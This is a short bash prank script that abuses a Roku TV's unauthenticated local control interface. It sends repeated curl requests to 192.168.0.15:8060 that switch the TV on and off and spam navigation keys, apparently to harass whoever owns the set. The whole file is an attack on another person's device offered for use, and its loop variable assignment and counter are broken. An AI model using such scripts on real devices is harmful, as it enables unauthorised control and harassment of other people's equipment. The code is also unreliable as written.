#!/bin/bash
# How to mess with someone who has a Roku TV 101
Hahaha = 1
while [ $Hahaha -le 100 ]
do
curl -d '' "http://192.168.0.15:8060/keypress/powerOn"
curl -d '' "http://192.168.0.15:8060/keypress/powerOff"
curl -d '' "http://192.168.0.15:8060/keypress/powerOn"
curl -d '' "http://192.168.0.15:8060/keypress/powerOff"
done
curl -d '' "http://192.168.0.15:8060/keypress/powerOn"
curl -d '' "http://192.168.0.15:8060/keypress/Home"
while [ $Hahaha -le 100 ]
do
curl -d '' "http://192.168.0.15:8060/keypress/left"
curl -d '' "http://192.168.0.15:8060/keypress/down"
done
echo "Can we still be friends?"
